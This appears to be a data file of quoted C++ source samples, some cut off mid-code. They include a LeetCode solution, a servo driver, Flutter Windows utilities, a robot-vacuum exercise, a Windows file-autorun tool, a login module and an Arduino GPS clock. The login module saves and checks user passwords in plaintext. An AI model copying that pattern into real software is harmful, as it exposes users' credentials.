    "//! LeetCode Question 237. Delete Node in a Linked List\r\n\r\n//? link: https://leetcode.com/problems/delete-node-in-a-linked-list/description/?envType=daily-question&envId=2024-05-05\r\n\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\nstruct ListNode {\r\n    int val;\r\n    ListNode *next;\r\n    ListNode(int x) : val(x), next(NULL) {}\r\n};\r\nclass Solution {\r\npublic:\r\n    void deleteNode(ListNode* node) {\r\n        node->val=node->next->val;\r\n        node->next=node->next->next;\r\n    }\r\n};\r\nint main() {\r\n    // Creating a linked list: 1 -> 2 -> 3 -> 4 -> 5\r\n    ListNode* head = new ListNode(1);\r\n    head->next = new ListNode(2);\r\n    head->next->next = new ListNode(3);\r\n    head->next->next->next = new ListNode(4);\r\n    head->next->next->next->next = new ListNode(5);\r\n\r\n    // Deleting the node with value 3\r\n    Solution sol;\r\n    ListNode* nodeToDelete = head->next->next; // Node with value 3\r\n    sol.deleteNode(nodeToDelete);\r\n\r\n    // Printing the modified linked list\r\n    ListNode* current = head;\r\n    while (current != nullptr) {\r\n        std::cout << current->val << \" \";\r\n        current = current->next;\r\n    }\r\n\r\n    // Clean up: Deleting all nodes to prevent memory leaks\r\n    current = head;\r\n    while (current != nullptr) {\r\n        ListNode* temp = current;\r\n        current = current->next;\r\n        delete temp;\r\n    }\r\n    return 0;\r\n}",
    "#include \"MksServo42c.h\"\r\n\r\nMKSServoDriver::MKSServoDriver() \r\n{\r\n  servoSerial = nullptr;\r\n}\r\n\r\nvoid MKSServoDriver::init(uint8_t RX, uint8_t TX, long const baudRate, uint8_t servoAddress) \r\n{\r\n    servoSerial = new EspSoftwareSerial::UART(RX, TX);\r\n    servoSerial->begin(baudRate);\r\n    rxCnt=0;\r\n    MStep = 0x08;\r\n    stepSize = 1.8;\r\n    servoAddress = 0xE0 + servoAddress;\r\n    txBuffer[0] = servoAddress;\r\n}\r\n\r\nfloat MKSServoDriver::sendServoSignal(command order)\r\n{\r\n  length = 3;\r\n  if(order == readEncoder){\r\n    txBuffer[1] = 0x30;\r\n    length = 8;\r\n  }\r\n  else if(order == readPulses){\r\n    txBuffer[1] = 0x33;\r\n    length = 6;\r\n  }\r\n  else if(order == readAngle){\r\n    txBuffer[1] = 0x36;\r\n    length =  6;\r\n  }\r\n  else if(order == readErrorAngle){\r\n    txBuffer[1] = 0x39;\r\n    length = 4;\r\n  }\r\n  else if(order == readEnableStatus){\r\n    txBuffer[1] = 0x3a;\r\n  }\r\n  else if(order == readShaftStatus){\r\n    txBuffer[1] = 0x3e;\r\n  }\r\n  else {\r\n    error();\r\n    return 0;\r\n  }\r\n  txBuffer[2] = getCheckSum(txBuffer,2);\r\n  servoSerial->write(txBuffer,3);\r\n  ack(length,order);\r\n  if(order!=readEnableStatus || order!=readShaftStatus)\r\n    return modValue;\r\n  return 0;\r\n}\r\nvoid MKSServoDriver::sendServoSignal(command order, uint8_t mode)\r\n{\r\n  length = 4;\r\n  if(order == sendCalibrate){\r\n    txBuffer[1] = 0x80;\r\n  }\r\n  else if(order == sendMotorType){\r\n    txBuffer[1] = 0x81;\r\n    stepSize = (mode*0.9) + 0.9;\r\n    MKSServoDriver::setConstants();\r\n  }\r\n  else if(order == sendControlMode){\r\n    txBuffer[1] = 0x82;\r\n  }\r\n  else if(order == sendOperatingCurrent){\r\n    txBuffer[1] = 0x83;\r\n  }\r\n  else if(order == sendStepSize){\r\n    txBuffer[1] = 0x84;\r\n    MStep = mode;\r\n    MKSServoDriver::setConstants();\r\n  }\r\n  else if(order == sendEnableType){\r\n    txBuffer[1] = 0x85;\r\n  }\r\n  else if(order == sendMotorDirection){\r\n    txBuffer[1] = 0x86;\r\n  }\r\n  else if(order == sendAutoScreenOff){\r\n    txBuffer[1] = 0x87;\r\n  }\r\n  else if(order == sendStallProtection){\r\n    txBuffer[1] = 0x88;\r\n  }\r\n  else if(order == sendInternalSubdivision){\r\n    txBuffer[1] = 0x89;\r\n  }\r\n  else if(order == sendUartBaud){\r\n    txBuffer[1] = 0x8a;\r\n  }\r\n  else if(order == sendUartAddress){\r\n    txBuffer[1] = 0x8b;\r\n  }\r\n  else if(order == sendZeroMode){\r\n    txBuffer[1] = 0x90;\r\n  }\r\n  else if(order == sendZeroPoint){\r\n    txBuffer[1] = 0x91;\r\n  }\r\n  else if(order == sendZeroSpeed){\r\n    txBuffer[1] = 0x92;\r\n  }\r\n  else if(order == sendZeroDirection){\r\n    txBuffer[1] = 0x93;\r\n  }\r\n  else if(order == moveZeroPoint){\r\n    txBuffer[1] = 0x94;\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = mode;\r\n  txBuffer[3] = getCheckSum(txBuffer,3);\r\n  if(order!=sendCalibrate)\r\n    servoSerial->write(txBuffer,4);\r\n  else\r\n  {\r\n    servoSerial->write(txBuffer,4);\r\n    delay(50000);\r\n  }\r\n  length = 3;\r\n  ack(length,order);\r\n}\r\n\r\n//Default values: Kp:0x650, Ki:0x1, Kd: 0x650, Acc: 0x11e, MaxT: 0x4B0 (max)\r\nvoid MKSServoDriver::setParameters(command order, uint16_t param)\r\n{\r\n  if(order == setKp){\r\n    txBuffer[1] = 0xA1;\r\n  }\r\n  else if(order == setKi){\r\n    txBuffer[1] = 0xA2;\r\n  }\r\n  else if(order == setKd){\r\n    txBuffer[1] = 0xA3;\r\n  }\r\n  else if(order == setAcc){\r\n    txBuffer[1] = 0xA4;\r\n  }\r\n  else if(order == setMaxTo){\r\n    txBuffer[1] = 0xA5;\r\n    param = static_cast<uint16_t>(percentageToRange(param,0x0000,0x04B0));\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = (param >> 8) & 0xFF;\r\n  txBuffer[3] = param & 0xFF;\r\n  txBuffer[4] = getCheckSum(txBuffer,4);\r\n  servoSerial->write(txBuffer,5);\r\n  ack(length,order);\r\n}\r\n\r\nvoid MKSServoDriver::constantControl(command order, float value, bool direction)\r\n{\r\n  length=4;\r\n  if(order == setEnable){\r\n    txBuffer[1] = 0xF3;\r\n  }\r\n  else if(order == runConstSpeed){\r\n    txBuffer[1] = 0xF6;\r\n    value = static_cast<uint8_t>((direction << 7) | percentageToRange(value, 0x00, 0x7F));\r\n  }\r\n  else if(order == stopMotor){\r\n    txBuffer[1] = 0xF7;\r\n    txBuffer[2] = getCheckSum(txBuffer,2);\r\n    servoSerial->write(txBuffer,3);\r\n    length = 3;\r\n    ack(length,order);\r\n    return ;\r\n  }\r\n  else if(order == saveOrClearStatus){\r\n    txBuffer[1] = 0xFF;\r\n  }\r\n  else {\r\n    error();\r\n    return ;\r\n  }\r\n  txBuffer[2] = value;\r\n  txBuffer[3] = getCheckSum(txBuffer,3);\r\n  servoSerial->write(txBuffer,4);\r\n  length=3;\r\n  ack(length,order);\r\n}\r\n\r\nvoid MKSServoDriver::variableControl(uint64_t mode)\r\n{\r\n  txBuffer[1] = 0xFD;\r\n  txBuffer[2] = (mode >> 32) & 0xFF;\r\n  txBuffer[3] = (mode >> 24) & 0xFF;\r\n  txBuffer[4] = (mode >> 16) & 0xFF;\r\n  txBuffer[5] = (mode >> 8) & 0xFF;\r\n  txBuffer[6] = mode & 0xFF;\r\n  txBuffer[7] = getCheckSum(txBuffer,7);\r\n  length = 3;\r\n  servoSerial->write(txBuffer,8);\r\n  command order = varControl;\r\n  ack(length,order);\r\n}\r\n\r\nuint8_t MKSServoDriver::getCheckSum(uint8_t *buffer,uint8_t size)\r\n{\r\n  uint8_t i;\r\n  uint16_t sum=0;\r\n  for(i=0;i<size;i++)\r\n    {\r\n      sum += buffer[i];\r\n    }\r\n  return(sum&0xFF);\r\n}\r\n\r\nvoid MKSServoDriver::ack(uint8_t len , command order)\r\n{\r\n  boo",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip> \r\nusing namespace std;\r\n\r\nclass Robot {\r\nprotected:\r\n    int batteryLife;\r\n    int* cleaningArea;\r\n    int* cleaningTime;\r\n    int hiz[2];\r\n\r\npublic:\r\n    virtual void move(int hedefX, int hedefY) = 0;\r\n    Robot() {\r\n        \r\n        hiz[0] = 0;\r\n        hiz[1] = 1;\r\n        cleaningArea = new int;\r\n\t\tbatteryLife = 100;\r\n        cleaningTime = new int;\r\n    }\r\n\r\n    virtual ~Robot() {\r\n        delete cleaningArea;\r\n        delete cleaningTime;\r\n    }\r\n};\r\n\r\nclass RobotSweeper : protected Robot {\r\nprivate:\r\n\t\tint *currentX;\r\n\t\tint *currentY;\r\n\t\tint *currentBatteryLife;\r\n\t\tint *x2;\r\n\t\tint *y2;\r\n\t\tint *paspas_suyu;\t\r\n\r\npublic:\r\n    RobotSweeper() : currentX(new int(0)), currentY(new int(0)), currentBatteryLife(new int(100)), paspas_suyu(new int(0)), x2(new int(0)), y2(new int(0)) { }\r\n    ~RobotSweeper() {\r\n        delete currentX;\r\n        delete currentY;\r\n        delete currentBatteryLife;\r\n        delete x2;\r\n        delete y2;\r\n        delete paspas_suyu;\r\n    }\r\n  \tint &cleaningtime_getir(){\r\n\t\treturn *cleaningTime;\r\n\t\t}\r\n\tint &batterylife_getir(){\r\n\t\treturn *currentBatteryLife;\r\n\t\t}\r\n\r\n\tvoid vacuum(){\r\n\t\t\tif (*currentBatteryLife <= 5) {\r\n              \trobotu_sarj_etme();}\r\n            else{\r\n\t\t\t}\r\n\t\t\t}\t\r\n\t\t\t\r\n\tvoid mop() {\r\n    \tif (*paspas_suyu > 0 && *currentBatteryLife > 5) {\r\n        \tif (hiz[0] == 1) {\r\n            \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n\t\t\t\t\r\n            else {\r\n            \t*currentBatteryLife = (*currentBatteryLife )- (*currentBatteryLife * 0.03);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n        }\r\n        else{\r\n\t        robotu_sarj_etme();\r\n\t\t\t}\r\n    }\r\n\r\n\tvoid sarj_istasyonuna_gitme() {\r\n    \t*x2 = *currentX;\r\n    \t*y2 = *currentY;\r\n    \t*currentX = 0;\r\n    \t*currentY = 0;\r\n\t\t}\r\n\tvoid robotu_sarj_etme(){\r\n\t\tsarj_istasyonuna_gitme();\r\n\t\t*currentBatteryLife = 100;\r\n\t\t*cleaningTime +=10;\r\n\t\t(*currentX) = (*x2)  ; \r\n    \t(*currentY) =(*y2) ; \r\n\t}\r\n\r\n\t\r\n\tRobotSweeper& operator=(const RobotSweeper& n) {\r\n   \t\t\t*y2 = *n.y2;\r\n   \t\t\t*x2 = *n.x2;\r\n   \t\t\t*cleaningTime = *n.cleaningTime;\r\n   \t\t\t*paspas_suyu = *n.paspas_suyu;\r\n        \t*currentBatteryLife = *n.currentBatteryLife;\r\n        \t*currentX = *n.currentX;\r\n        \t*currentY = *n.currentY;\r\n     \t\treturn *this;\r\n   }\r\n    void move(int x,int y) override {\r\n\t\tif(*currentBatteryLife <= 5){\r\n\t\t\tcout << \"Hareket icin yeterli enerji yok\" << endl;\r\n\t\t\trobotu_sarj_etme();\r\n\t\t\t}\r\n\t\tint x_mesafe = x - (*currentX);\r\n\t\tint y_mesafe = y - (*currentY);\r\n\t\tif(x_mesafe>0 || y_mesafe > 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n\t\tif(x_mesafe<0 || currentY < 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n    \tif (x_mesafe < 0) {\r\n        \t(*currentX) -= 1;\r\n    \t}\r\n    \tif (x_mesafe > 0) {\r\n        (*currentX) += 1;\r\n    \t}\r\n    \tif (currentY < 0) {\r\n        \t(*currentY) -= 1;\r\n    \t}\r\n    \tif (currentY > 0) {\r\n        \t(*currentY) += 1;\r\n    \t}\r\n\r\n\t\tif (hiz[0] == 1) {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.01);\r\n        \t*cleaningTime += 2;}\t\t\r\n    \telse {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t*cleaningTime += 1;\r\n\t\t\t}\r\n\t\t\t}\r\n\r\n};\r\nclass House{\r\n\tpublic:\r\n\t\tint x;\r\n\t\tint y;\r\n\t\tHouse() : x(0), y(0) {}\r\n\t\t\r\n};\r\nclass Room:public House{\r\npublic:\r\n\tint x1;\r\n\tint y1;\r\n\tint obstacleX;\r\n\tint obstacleY;\r\n\tRoom() : x1(0), y1(0),obstacleX(0),obstacleY(0){}\r\n\tint getRoom() const {\r\n        cout << \"Oda Bilgisi:\" << endl;\r\n        cout << \"Kordinatlar: (\" << x1 << \", \" << y1 << \")\" << std::endl;\r\n        cout << \"Engel Kordinatlari: (\" << obstacleX << \", \" << obstacleY << \")\" << std::endl;\r\n        return x1 + y1 + obstacleX + obstacleY;\r\n    }\r\n};\r\nclass Area:public House{\r\npublic:\r\n\tint edgeX;\r\n\tint edgeY;\r\n\tArea() : edgeX(0), edgeY(0){}\r\n\tint getArea() const {\r\n        std::cout << \"Konum Bilgisi:\" << std::endl;\r\n        std::cout << \"Engel Kordinatlari: (\" << edgeX << \", \" << edgeY << \")\" << std::endl;\r\n        return edgeX * edgeY;\r\n    }\r\n};\r\nvoid harita_dosyasi_okuma(const std::string& dosyaadi, std::vector<Room>& odalar, std::vector<std::pair<int, int>>& engel) {\r\n    ifstream inputFile(dosyaadi);\r\n    string obje_turu;\r\n    if (!inputFile) {\r\n        cerr << \"Dosya acilamadi !!\" << endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    while (inputFile >> obje_turu) {\r\n        if (obje_turu == \"Room\") {\r\n            Room oda;\r\n            inputFile >> oda.x1 >> oda.y1 >> oda.obstacleX >> oda.obstacleY;\r\n            odalar.push_back(oda);\r\n        } else if (obje_turu == \"Obstacle\") {\r\n            int engel_x;\r\n\t\t\tint engel_y;\r\n            inputFile >> engel_x >> engel_y;\r\n            engel.emplace_back(engel_x, engel_y);\r\n        }\r\n    }\r\n\r\n    inputFile.close();\r\n}\r\n\r\n\r\nvoid cleanArea(RobotSweeper& robot, int ilk_x, int ilk_y, int son_x, int son_y, const vector<pair<int, int>>& engeller) {\r\n    int& cleaningTime = robot.cleaningtime_getir();\r\n    int& batt",
    "#include <bits/stdc++.h>\r\n#include <synchapi.h>\r\n#include <windows.h>\r\n#include \"include/configor/json.hpp\"\r\n#include \"include/inicpp.hpp\"\r\n#include \"include/path.h\"\r\n#include \"include/system.h\"\r\n\r\nusing namespace std;\r\nusing namespace path;\r\nusing namespace configor;\r\nusing namespace inicpp;\r\n\r\nstring self_path, self_name;\r\n\r\nclass Task {\r\npublic:\r\n\tstring path;\r\n\tsize_t trigger_count;\r\n\tclock_t trigger_interval;\r\n\tbool auto_trigger;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &task);\r\n\tinline void init(const string &p, const size_t &tc, const clock_t &ti, const bool &at);\r\n\r\n\tTask() { init(); }\r\n\tTask(const json::value &task) { init(task); }\r\n\tTask(const string &p, const size_t &tc, const clock_t &ti, const bool &at) { init(p, tc, ti, at); }\r\n\r\n\tvoid run();\r\n};\r\nclass Config {\r\npublic:\r\n\tclock_t interval_time, interval_eps;\r\n\tvector<Task> task;\r\n\r\n\tinline void init();\r\n\tinline void init(const json::value &config);\r\n\tinline bool init(const string &config_path);\r\n\tinline void init(const clock_t &it, const clock_t &ie, const vector<Task> &t);\r\n\r\n\tConfig() { init(); }\r\n\tConfig(const json::value &config) { init(config); }\r\n\tConfig(const string config_path) { init(config_path); }\r\n\tConfig(const clock_t &it, const clock_t &ie, const vector<Task> &t) { init(it, ie, t); }\r\n};\r\n\r\ninline bool loadConfig(string path, json::value &data) {\r\n\tdata.clear();\r\n\tifstream file(path.c_str());\r\n\tif (!file.is_open()) return true;\r\n\ttry {\r\n\t\tfile >> json::wrap(data);\r\n\t} catch (exception &_ERROR_) { return true; }\r\n\tfile.close();\r\n\treturn false;\r\n}\r\n\r\ninline void Task::init() {\r\n\tpath = \"\";\r\n\ttrigger_count = 1;\r\n\ttrigger_interval = 0;\r\n\tauto_trigger = true;\r\n}\r\ninline void Task::init(const json::value &task) {\r\n\tinit();\r\n\tpath = task[\"path\"];\r\n\tpathDelete(path);\r\n\tif (task.count(\"trigger_count\") > 0)\r\n\t\ttrigger_count = stol(task[\"trigger_count\"]);\r\n\tif (task.count(\"trigger_interval\") > 0)\r\n\t\ttrigger_interval = stol(task[\"trigger_interval\"]);\r\n\tif (task.count(\"auto_trigger\") > 0)\r\n\t\tauto_trigger = task[\"auto_trigger\"];\r\n}\r\ninline void Task::init(const string &p, const size_t &tc, const clock_t &ti, const bool &at) {\r\n\tinit();\r\n\tpath = p;\r\n\ttrigger_count = tc;\r\n\ttrigger_interval = ti;\r\n\tauto_trigger = at;\r\n}\r\n\r\ninline void Config::init() {\r\n\tinterval_time = 100;\r\n\tinterval_eps = 1000;\r\n\ttask.clear();\r\n}\r\ninline void Config::init(const json::value &config) {\r\n\tinit();\r\n\tinterval_time = stol(config[\"interval_time\"]);\r\n\tif (config.count(\"interval_eps\"))\r\n\t\tinterval_eps = stol(config[\"interval_eps\"]);\r\n\tif (config.count(\"task\") > 0) {\r\n\t\tfor (json::value subtask : config[\"task\"])\r\n\t\t\ttask.push_back(subtask);\r\n\t}\r\n}\r\ninline bool Config::init(const string &config_path) {\r\n\tjson::value config;\r\n\tbool is_failed = loadConfig(config_path, config);\r\n\tif (is_failed) return true;\r\n\r\n\tinit(config);\r\n\r\n\treturn false;\r\n}\r\ninline void Config::init(const clock_t &it, const clock_t &ie, const vector<Task> &t) {\r\n\tinit();\r\n\tinterval_time = it;\r\n\tinterval_eps = ie;\r\n\ttask = t;\r\n}\r\n\r\ninline void debug(const Config &config) {\r\n\tcout << config.interval_time << \"\\n\";\r\n\tfor (Task subtask : config.task) {\r\n\t\tcout << subtask.path << \" \" << subtask.trigger_count << \" \" << subtask.trigger_interval << \" \" << subtask.auto_trigger << \"\\n\";\r\n\t}\r\n}\r\n\r\nvoid Task::run() {\r\n\tstring target, trash;\r\n\tpathSplit(path, target, trash);\r\n\tchdir(target.c_str());\r\n\tvector< future<void> > pool;\r\n\tfor (size_t i = 1; i <= trigger_count; i++) { // PTSD\r\n\t\tpool.push_back(async(launch::async, executefile, path));\r\n\t\tif (i < trigger_count)\r\n\t\t\tSleep(trigger_interval);\r\n\t}\r\n\tfor (future<void> &fut : pool)\r\n\t\tfut.wait();\r\n\tchdir(self_path.c_str());\r\n}\r\nvoid process(const Config &config) {\r\n\tclock_t time_rec, time_now;\r\n\ttime_rec = time_now = 0;\r\n\tmap<string, bool> exist_rec;\r\n\tfor (Task subtask : config.task)\r\n\t\texist_rec[subtask.path] = false;\r\n\twhile (true) {\r\n\t\ttime_rec = time_now;\r\n\t\ttime_now = clock();\r\n\t\tfor (Task subtask : config.task) {\r\n\t\t\tconst string &path = subtask.path; // PTSD\r\n\t\t\tbool exist_now = pathExist(path);\r\n\t\t\tif (exist_now && (!exist_rec[path] || (subtask.auto_trigger && time_now - time_rec > config.interval_time + config.interval_eps))) {\r\n\t\t\t\tfuture<void> trash = async(launch::async, Task::run, subtask); // \u6709\u98ce\u9669\uff0c\u76ee\u524d\u6700\u4f18\r\n\t\t\t}\r\n\t\t\texist_rec[path] = exist_now;\r\n\t\t}\r\n\t\tSleep(config.interval_time);\r\n\t}\r\n}\r\nint main(int n_, char** config_path_) {\r\n\tpathSplit(_pgmptr, self_path, self_name);\r\n\tHWND console = GetConsoleWindow();\r\n\tstring ini_config_path = self_path + \"\\\\config.ini\";\r\n\tpathDelete(ini_config_path);\r\n\tIniManager ini_config(ini_config_path.c_str());\r\n\r\n\tif (ini_config[\"Autorun\"][\"hide_console_window\"] == \"1\")\r\n\t\tShowWindow(console, SW_HIDE);\r\n\r\n\tvector<string> config_path;\r\n\tif (n_ == 1)\r\n\t\tconfig_path.push_back(ini_config[\"Autorun\"][\"default_profile\"]);\r\n\telse\r\n\t\tfor (int i = 1; i < n_; i++)\r\n\t\t\tconfig_path.push_back(config_path_[i]);\r\n\r\n\tfor (string path : config_path) {\r\n\t\tConfig config;\r\n\t\tbool is_failed = config.init(path);\r\n\t\tif (is_fail",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"auth.h\"\n#include <iostream>\n#include <fstream>\n#include <sstream>\n\n// \u00b3\u00f5\u00ca\u00bc\u00bb\u00af\u00cd\u00e2\u00b2\u00bf\u00b1\u00e4\u00c1\u00bf\nstd::map<std::string, std::string> users;\nconst std::string USER_FILE = \"users.dat\";\nstd::string currentLoggedInUser = \"\";\n\n\nvoid loadUsers() {\n    std::ifstream file(USER_FILE);\n    std::string line, username, password;\n    while (std::getline(file, line)) {\n        std::istringstream iss(line);\n        if (!(iss >> username >> password)) {\n            break;\n        }\n        users[username] = password;\n    }\n}\n\nvoid saveUsers() {\n    std::ofstream file(USER_FILE);\n    for (const auto& user : users) {\n        file << user.first << \" \" << user.second << std::endl;\n    }\n}\n\nbool registerUser(const std::string& username, const std::string& password) {\n    if (users.find(username) != users.end()) {\n        std::cout << \"Username already exists.\" << std::endl;\n        return false;\n    }\n    users[username] = password;\n    saveUsers();\n    return true;\n}\n\nbool login(const std::string& username, const std::string& password) {\n    loadUsers();\n    if (users.find(username) == users.end()) {\n        std::cout << \"Username does not exist.\" << std::endl;\n        return false;\n    }\n    if (users[username] != password) {\n        std::cout << \"Incorrect password.\" << std::endl;\n        return false;\n    }\n    std::cout << \"Login successful!\" << std::endl;\n    currentLoggedInUser = username;\n    return true;\n}\n\nvoid logout() {\n    if (!currentLoggedInUser.empty()) {\n        std::cout << \"User \" << currentLoggedInUser << \" has logged out.\" << std::endl;\n        currentLoggedInUser = \"\";\n    }\n    else {\n        std::cout << \"No user is currently logged in.\" << std::endl;\n    }\n}\n",
    "// Including the required Arduino libraries\n#include <MD_Parola.h>\n#include <MD_MAX72xx.h>\n#include <SPI.h>\n#include <TinyGPS++.h>       // include TinyGPS++ library\n#include <TimeLib.h>         // include Arduino time library\n#include <SoftwareSerial.h>  // include software serial library\n\n// Uncomment according to your hardware type\n#define HARDWARE_TYPE MD_MAX72XX::FC16_HW\n//#define HARDWARE_TYPE MD_MAX72XX::GENERIC_HW\n\n// Defining size, and output pins\n#define MAX_DEVICES 8\n#define CS_PIN 9\n\nTinyGPSPlus gps;\n\n#define S_RX 3  // define software serial RX pin (No TX used)\n\nSoftwareSerial SoftSerial(S_RX, -1);  // configure SoftSerial library\n\n// Create a new instance of the MD_Parola class with hardware SPI connection\nMD_Parola myDisplay = MD_Parola(HARDWARE_TYPE, CS_PIN, MAX_DEVICES);\n\n#define time_offset -14400  // define a clock offset in seconds Note: (1 hour) ==> UTC + 1 (but in seconds)\n\n// variable definitions\nchar Time[] = \"TIME: 00:00:00\";\nchar Date[] = \"DATE: 00-00-2000\";\nbyte last_second, Second, Minute, Hour, Day, Month;\nint Year;\n\n// variable defaults\nbool timeIsSet = false;\n\nint h, m, s;\n\nint mill = 0;\n\nint timeout = 0;\nint lastMillis = 0;\nint lastCheck = 0;\n\nunsigned long currentMillis = 0;\n\nvolatile bool pulse = false;\n\n\nvoid setup() {\n  //Strictly utilized for debugging purposes.\n  Serial.begin(115200);\n\n  // Set the intensity (brightness) of the display (0-15)\n  myDisplay.begin();\n  myDisplay.setIntensity(0);\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_LEFT);\n\n  cli();  // Disable interrupts\n    // Set Timer2 to interrupt every 1 ms\n  TCCR2A = 0;  // Set entire TCCR2A register to 0\n  TCCR2B = 0;  // Same for TCCR2B\n  TCNT2 = 0;   // Initialize counter value to 0\n  // Set compare match register to desired timer count.\n  OCR2A = 249;  // 16MHz / 64 (prescaler) / 250 = 1000 Hz\n  // Enable CTC mode\n  TCCR2A |= (1 << WGM21);\n  // Set prescaler to 64 and start the timer\n  TCCR2B |= (1 << CS22);\n  // Enable timer compare interrupt\n  TIMSK2 |= (1 << OCIE2A);\n\n  // Enable global interrupts\n  sei();  // Enable interrupts\n\n  attachInterrupt(digitalPinToInterrupt(2), PPS, RISING);  // Attach interrupt to pin 2, triggering on rising edge\n}\n\n// Triggered every 1ms, using timer2 interrupts for accurate (enough) timing of the milliseconds.\nISR(TIMER2_COMPA_vect) {\n  if (timeIsSet) {\n    mill++;  //increment by 1;\n  }\n}\n\nvoid loop() {\n  if (timeIsSet == false) {  //Determine whether the GPS is needed to set the initial time.\n    timeIsSet = true;\n\n    Serial.print(\"Time is being set...\");\n\n    SoftSerial.begin(9600);  // initialize software serial at 9600 baud\n\n    getTime();\n\n    SoftSerial.end();  // End it so that it does not interfere later...\n\n    Serial.println(\"done!\");\n\n    myDisplay.setTextAlignment(PA_LEFT);\n\n    h = String(hour()).toInt();\n    m = String(minute()).toInt();\n    s = String(second()).toInt();\n\n    mill = 0;\n    timeout = 0;\n  }\n\n  if (pulse) {\n    pulse = false;\n    timeout = 0;\n    mill = 0;\n\n    s++;\n  }\n\n\n  /*if (timeout >= 5000) {\n    timeout = 0;\n    timeIsSet = false;\n    Serial.println(\"Timed out, acquiring new time from GPS...\");\n  }*/\n\n\n  ////////////////// WORK WITH TIME ///////////////////\n\n  if (s > 59) {\n    s = 0;\n    m++;\n    mill = 0;\n  }\n  if (m > 59) {\n    m = 0;\n    h++;\n    mill = 0;\n  }\n  if (h > 23) {\n    h = 0;\n    m = 0;\n    s = 0;\n    mill = 0;\n  }\n\n  printTime(String(h).toInt(), String(m).toInt(), String(s).toInt(), String(mill).toInt());\n}\n\nvoid printTime(int hr, int mn, int sc, int ms) {\n  String hour_str = String(hr);\n  String minute_str = String(mn);\n  String second_str = String(sc);\n  String millisecond_str = String(ms);\n\n  // Format the data to fit on the display better, and increase readability;\n\n  if (hr < 10) {\n    hour_str = \"0\" + hour_str;\n  }\n\n  if (mn < 10) {\n    minute_str = \"0\" + minute_str;\n  }\n\n  if (sc < 10) {\n    second_str = \"0\" + second_str;\n  }\n\n  if (ms < 10) {\n    millisecond_str = \"0\" + millisecond_str;\n  } 